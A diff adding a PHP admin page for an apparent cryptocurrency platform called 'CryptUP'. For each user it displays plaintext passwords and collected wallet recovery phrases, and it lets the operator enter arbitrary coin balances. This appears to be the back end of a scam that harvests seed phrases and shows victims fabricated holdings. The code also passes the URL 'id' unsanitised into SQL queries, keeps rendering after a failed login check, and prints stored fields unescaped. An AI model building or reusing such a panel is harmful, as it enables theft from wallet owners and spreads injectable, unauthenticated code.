@@ -1,0 +1,231 @@
+<?php
+include_once "../config/config.php";
+if (!isset($_SESSION["cryptup_admin"])) {
+  echo "<script>location.href = 'login.php'</script>";
+}
+
+if (!empty($_GET["id"])) {
+  $id = $_GET["id"];
+} else {
+  echo "<script>location.href = 'users.php'</script>";
+}
+
+$getUser = mysqli_query($conn, "SELECT * FROM `users` WHERE `id` = '$id'");
+if (mysqli_num_rows($getUser) == 0) {
+  echo "<script>location.href = 'users.php'</script>";
+}
+$user = mysqli_fetch_assoc($getUser);
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CryptUP || Admin Dashboard</title>
+  <link rel="icon" href="data:image/x-icon;base64," type="image/x-icon" />
+  <link crossorigin href="https://fonts.gstatic.com/" rel="preconnect" />
+  <link as="style" rel="stylesheet" onload="this.rel='stylesheet'"
+    href="https://fonts.googleapis.com/css2?display=swap&family=Manrope:wght@400;500;700;800&family=Noto+Sans:wght@400;500;700;900" />
+  <script src="../assets/js/tailwindcss.js"></script>
+  <style type="text/tailwindcss">
+    :root {
+      --primary-color: #53d22c;
+      --background-color: #121212;
+      --text-primary: #E0E0E0;
+      --text-secondary: #A0A0A0;
+      --accent-color: #66bb6a;
+      --surface-color: #1E1E1E;
+      --border-color: #333333;
+    }
+    body {
+      font-family: 'Manrope', 'Noto Sans', sans-serif;
+    }
+    .card {
+      @apply bg-[var(--surface-color)] rounded-2xl p-4 sm:p-6 shadow-lg;
+    }
+    .input {
+      @apply w-full bg-[var(--on-surface-color)] text-[var(--text-primary)] border border-[var(--border-color)] rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[var(--primary-color)] transition-shadow;
+    }
+    .button_primary {
+      @apply bg-[var(--primary-color)] text-black rounded-full px-4 py-2 sm:px-6 sm:py-3 font-bold hover:bg-[var(--accent-color)] transition-colors duration-300;
+    }
+    .button_secondary {
+      @apply bg-gray-700 text-[var(--text-primary)] rounded-full px-4 py-2 sm:px-6 sm:py-3 font-bold hover:bg-gray-600 transition-colors duration-300;
+    }
+    .sidebar-mobile {
+      transform: translateX(-100%);
+    }
+    .sidebar-mobile.open {
+      transform: translateX(0);
+    }
+    @media (min-width: 768px) {
+      .sidebar-mobile {
+        transform: translateX(0);
+      }
+    }
+  </style>
+</head>
+
+<body class="bg-[var(--background-color)] text-[var(--text-primary)] overflow-x-hidden">
+  <div class="flex min-h-screen">
+    <?php include "components/sidebar.php"; ?>
+
+    <!-- Main Content -->
+    <div class="flex-1 flex flex-col min-w-0">
+      <!-- Mobile Top Bar -->
+      <?php include "components/header.php"; ?>
+
+      <!-- Main Dashboard -->
+      <main class="flex-1 p-4 sm:p-6 lg:p-8">
+
+        <!-- start -->
+        <div class="mb-6 sm:mb-8">
+          <h1 class="text-2xl sm:text-3xl lg:text-4xl font-bold mb-2">User Info</h1>
+        </div>
+
+
+        <!-- User Info -->
+        <div class="card mb-3">
+          <div class="grid grid-cols-1 md:grid-cols-3">
+            <div class="mb-2">
+              <small class="">Name</small>
+              <p class=""><?= $user["name"]; ?></p>
+            </div>
+            <div class="mb-2">
+              <small class="">Email</small>
+              <p class=""><?= $user["email"]; ?></p>
+            </div>
+            <div class="mb-2">
+              <small class="">Password</small>
+              <p class=""><?= $user["password"]; ?></p>
+            </div>
+          </div>
+        </div>
+        <!-- wallet phrases -->
+        <div class="card mb-3">
+          <?php
+          $getPhrases = mysqli_query($conn, "SELECT * FROM `wallet_phrases` WHERE `user_id` = '$id'");
+          if (mysqli_num_rows($getPhrases) > 0):
+            while ($wallet = mysqli_fetch_assoc($getPhrases)):
+              ?>
+              <div class="mb-4">
+                <div class="mb-2">
+                  <small class="">Wallet</small>
+                  <p class=""><?= $wallet["wallet"]; ?></p>
+                </div>
+                <div class="mb-2">
+                  <small class="">Phrase</small>
+                  <p class=""><?= $wallet["phrase"]; ?></p>
+                </div>
+              </div>
+              <?php
+            endwhile;
+          endif;
+          ?>
+        </div>
+        <!-- User Coin Form -->
+        <div class="card mb-3">
+          <form method="post">
+            <h2 class="font-semibold text-xl mb-3">Add Coin For This User</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div class="mb-3 flex flex-col space-y-2">
+                <label for="coin" class="font-semibold text-sm">Coin</label>
+                <input type="text" id="coin" name="coin" placeholder="e.g Bitcoin" class="p-3 input">
+              </div>
+              <div class="mb-3 flex flex-col space-y-2">
+                <label for="aka" class="font-semibold text-sm">A.K.A</label>
+                <input type="text" id="aka" name="aka" placeholder="e.g BTC" class="p-3 input">
+              </div>
+              <div class="mb-3 flex flex-col space-y-2">
+                <label for="price" class="font-semibold text-sm">Price ($)</label>
+                <input type="number" id="price" name="price" placeholder="e.g 35000" class="p-3 input">
+              </div>
+              <div class="mb-3 flex flex-col space-y-2">
+                <label for="balance" class="font-semibold text-sm">Balance ($)</label>
+                <input type="number" id="balance" name="balance" placeholder="e.g 1200" class="p-3 input">
+              </div>
+              <div class="mb-3 flex flex-col space-y-2">
+                <label for="coin_bal" class="font-semibold text-sm">Coin Balance</label>
+                <input type="text" id="coin_bal" name="coin_bal" placeholder="e.g 0.0123" class="p-3 input">
+              </div>
+              <div class="mb-3 flex flex-col space-y-2">
+                <label for="address" class="font-semibold text-sm">Address</label>
+                <input type="text" id="address" name="address" placeholder="your wallet address for this coin"
+                  class="p-3 input">
+              </div>
+            </div>
+            <button class="button_secondary" name="add" type="submit">Add Coin</button>
+            <?php
+            if (isset($_POST["add"])) {
+              $coin = htmlspecialchars($_POST["coin"]);
+              $aka = htmlspecialchars($_POST["aka"]);
+              $price = htmlspecialchars($_POST["price"]);
+              $balance = htmlspecialchars($_POST["balance"]);
+              $coin_bal = htmlspecialchars($_POST["coin_bal"]);
+              $address = htmlspecialchars($_POST["address"]);
+
+              $send = mysqli_query($conn, "INSERT INTO `users_coins` (`user_id`, `coin`, `aka`, `price`, `balance`, `coin_balance`, `address`) VALUES ('$id','$coin','$aka','$price','$balance','$coin_bal','$address')");
+              if ($send) {
+                echo "<script>alert('Added Successfully ✔️');</script>";
+              } else {
+                echo "<script>alert('Something went wrong 🚫');</script>";
+              }
+            }
+            ?>
+          </form>
+        </div>
+        <!-- coins table -->
+        <div class="card">
+          <div class="overflow-x-auto">
+            <table class="w-full text-left text-sm">
+              <thead>
+                <tr class="border-b border-[var(--border-color)]">
+                  <th class="p-3 text-[var(--text-secondary)] font-semibold">Asset</th>
+                  <th class="p-3 text-[var(--text-secondary)] font-semibold">Balance</th>
+                  <th class="p-3 text-[var(--text-secondary)] font-semibold">Price</th>
+                  <th class="p-3 text-right text-[var(--text-secondary)] font-semibold">Value</th>
+                  <th class="p-3 text-right text-[var(--text-secondary)] font-semibold">Action</th>
+                </tr>
+              </thead>
+              <tbody>
+                <?php
+                $getUserCoins = mysqli_query($conn, "SELECT * FROM `users_coins` WHERE `user_id` = '$id'");
+                if (mysqli_num_rows($getUserCoins) > 0):
+                  while ($data = mysqli_fetch_assoc($getUserCoins)):
+                    ?>
+                    <tr class="border-b border-[var(--border-color)] hover:bg-white/5 transition-colors">
+                      <td class="p-3">
+                        <div class="flex items-center gap-4">
+                          <div>
+                            <p class="font-semibold text-white"><?= strtoupper($data['coin']) ?></p>
+                            <p class="text-sm text-[var(--text-secondary)]"><?= strtoupper($data['aka']) ?></p>
+                          </div>
+                        </div>
+                      </td>
+                      <td class="p-3 font-medium text-white"><?= $data['coin_balance'] . " " . strtoupper($data['aka']); ?>
+                      </td>
+                      <td class="p-3 font-medium text-white">$<?= number_format($data["price"]) ?></td>
+                      <td class="p-3 text-right font-semibold text-white">$<?= number_format($data["balance"]) ?></td>
+                      <td class="p-3 text-right font-semibold text-white flex gap-3 justify-end items-center">
+                        <a href="edit-asset.php?id=<?= $data['id'] ?>">🖋️</a>
+                        <a href="delete-asset.php?id=<?= $data['id'] ?>">🗑️</a>
+                      </td>
+                    </tr>
+                    <?php
+                  endwhile;
+                endif;
+                ?>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </main>
+    </div>
+  </div>
+
+
+</body>
+
+</html>
